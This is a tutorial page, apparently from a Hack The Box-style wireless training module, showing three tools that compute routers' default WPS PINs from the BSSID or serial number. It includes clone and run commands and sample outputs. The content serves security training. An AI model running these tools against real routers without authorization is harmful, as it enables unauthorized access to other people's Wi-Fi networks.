---
title: Using PIN Generation Tools
description: Using PIN Generation Tools
date: '2026-09-21'
tags: []
published: true
slug: using-pin-generation-tools
category: wifi
folder: online-bruteforcing
order: 50
---
# Using PIN Generation Tools

## What's the Point?

Guessing all 11,000 possible WPS PINs is slow. But here's the thing: **many routers don't use random PINs at all.** Some vendors calculate the PIN using a fixed formula based on the router's MAC address (BSSID) or serial number.

If we know the formula, we can skip straight to the correct PIN — no guessing needed.

This guide covers 3 tools that do exactly that:

1. **Default-wps-pin** (for Vodafone EasyBox / Arcadyan routers)
2. **WPS-PIN** (a general-purpose PIN generator)
3. **Naranja MekaniK (nmk)** (for specific Arcadyan/Livebox models)

---

## Tool 1: [Default-wps-pin](https://github.com/eye9poob/Default-wps-pin) (Vodafone EasyBox)

**Background:** Back in 2013, a flaw was found in DSL routers made by Arcadyan and rebranded for [Vodafone Germany](https://seclists.org/fulldisclosure/2013/Aug/51). These routers calculate their default WPS PIN using a formula based on the router's MAC address and serial number (the serial number itself can also be derived from the MAC address).

**Step 1:** Clone the tool:

```shellsession
iccys@htb[/htb]$ git clone https://github.com/eye9poob/Default-wps-pin
```

**Step 2:** Run it with the target's BSSID:

```shellsession
iccys@htb[/htb]$ python2 /opt/Default-wps-pin/default-wps-pin.py 60:38:E0:D4:A2:5E

derived serial number: R----55185
SSID: Arcor|EasyBox|Vodafone-04D755
WPS pin: 27038895
```

🎉 In seconds, it calculated the serial number, the likely network name, and the default PIN (`27038895`) — no brute-forcing required.

---

## Tool 2: [WPS-PIN Script](https://github.com/linkp2p/WPS-PIN)

This is a more general tool that includes several known PIN-generation algorithms bundled together.

**Run it:**

```shellsession
iccys@htb[/htb]$ /opt/WPSPIN.sh 

              _       _  _____    _____   _____  _______  _     _ 
             (_)  _  (_)(_____)  (_____) (_____)(_______)(_)   (_)
             (_) (_) (_)(_)__(_)(_)___   (_)__(_)  (_)   (__)_ (_)
             (_) (_) (_)(_____)   (___)_ (_____)   (_)   (_)(_)(_)
             (_)_(_)_(_)(_)       ____(_)(_)     __(_)__ (_)  (__)
              (__) (__) (_)      (_____) (_)    (_______)(_)   (_)    

 www.crack-wifi.com     www.facebook.com/soufian.ckin2u    www.auditoriaswireless.net

               by kcdtv feat. antares_145,  r00tnuLL and 1camaron1
               including computepinC83A35 algorithm by ZaoChunseng 

                   DEFAULT PIN GENERATOR & WPS PROTOCOL ATTACK


                         +---------------------------+     
                         |     1  -  ENGLISH         |     
                         |     2  -  ESPANOL         |     
                         |     3  -  FRANCAIS        |     
                         +---------------------------+     
 

                                Language : 1

          WARNING :  NO COMPATIBLE WIRELESS INTERFACE IS AVAILABLE   
     WPSPIN will be executed in a reduced mode without scanning or attack
             You can reload interface checking with option 2



                                     ¿     ?           
                                ?       ?              
                               ¿   >X<    ¿          
                               -  (O o)  -         
                    +---------ooO--(_)--Ooo-------------+   
                    |                                   |   
                    |    1 -  GENERATE PIN              |   
                    |    2 -  RELOAD INTERFACES CHECK   |   
                    |    3 -  EXIT WPSPIN               |   
                    |                                   |   
                    +-----------------------------------+   




                              Your choice : 1

                    -------------------------------------

                1 > Insert eSSID and press <Enter> : HackTheBox
  
                2 > Insert bSSID and press <Enter> : 72:40:6e:74:2f:3b
  
--------------------------------------------------
       ¡UNKNOWN OR UNSUPPORTED MODEL!   
--------------------------------------------------
                 POSSIBLE PIN > 76142673 
 
      ......  press <enter> to continue......
```

**How to use it:**

1. Run the script
2. Pick your language (option 1 for English)
3. Choose option **1 — GENERATE PIN**
4. Enter the network's SSID and BSSID when prompted
5. It outputs a possible PIN — even for "unknown" router models, it makes a best-effort guess

📝 Note: The "NO COMPATIBLE WIRELESS INTERFACE" warning just means it's running in PIN-calculation-only mode, without live scanning/attacking. That's fine for this use case.

---

## Tool 3: [Naranja MekaniK](https://github.com/kcdtv/nmk) (nmk)

This tool targets 3 very specific router models:

- Arcadyan ARV7519RW22 (aka Livebox 2.1)
- Arcadyan ARV7520CW22 (aka Livebox 2.1)
- Arcadyan VRV9510KWAC23 (aka Livebox Next)

**What you need:**

- The **last 4 digits** of the router's 2.4GHz BSSID
- The **last 4 digits** of the serial number (usually printed on a sticker on the back of the router)

**Run it:**

```shellsession
iccys@htb[/htb]$  python2 /opt/nmk/orangen.py A2BD 7281

99559236
```

That's it — it outputs the calculated PIN (`99559236`) directly.

---

## Why This Matters

These tools let you potentially skip brute-forcing entirely. Instead of guessing thousands of PINs (and risking a lockout), you calculate the _exact_ PIN in seconds — as long as the router model is supported by one of these algorithms.

---

## Command Summary

```bash
git clone https://github.com/eye9poob/Default-wps-pin              # Download the Vodafone EasyBox PIN tool
python2 /opt/Default-wps-pin/default-wps-pin.py <BSSID>             # Calculate the default PIN from a BSSID
/opt/WPSPIN.sh                                                       # Launch the general-purpose WPS-PIN tool (interactive menu)
python2 /opt/nmk/orangen.py <last4-BSSID> <last4-serial>            # Calculate PIN for specific Arcadyan/Livebox models
```

**What each argument means:**

|Argument|Meaning|
|---|---|
|`<BSSID>`|The target router's MAC address|
|`<last4-BSSID>`|Just the last 4 characters of the BSSID (nmk only)|
|`<last4-serial>`|Just the last 4 digits of the router's serial number (nmk only)|
|`python2`|These older tools require Python 2 specifically, not Python 3|
